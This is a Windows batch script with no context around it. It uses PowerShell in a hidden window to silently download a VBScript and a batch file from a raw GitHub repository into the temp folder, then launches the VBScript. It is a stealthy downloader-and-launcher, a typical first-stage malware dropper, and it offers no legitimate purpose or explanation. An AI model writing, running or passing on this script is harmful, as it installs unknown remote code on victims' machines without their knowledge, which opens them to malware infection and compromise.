@echo off
set "vbsUrl=https://raw.githubusercontent.com/ofutpemata22/mamf/main/ngr.vbs"
set "batUrl=https://raw.githubusercontent.com/ofutpemata22/mamf/main/ngr.bat"
set "vbsFile=%TEMP%\ngr.vbs"
set "batFile=%TEMP%\ngr.bat"

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%vbsUrl%', '%vbsFile%'); (New-Object Net.WebClient).DownloadFile('%batUrl%', '%batFile%')"
start "" "%vbsFile%"
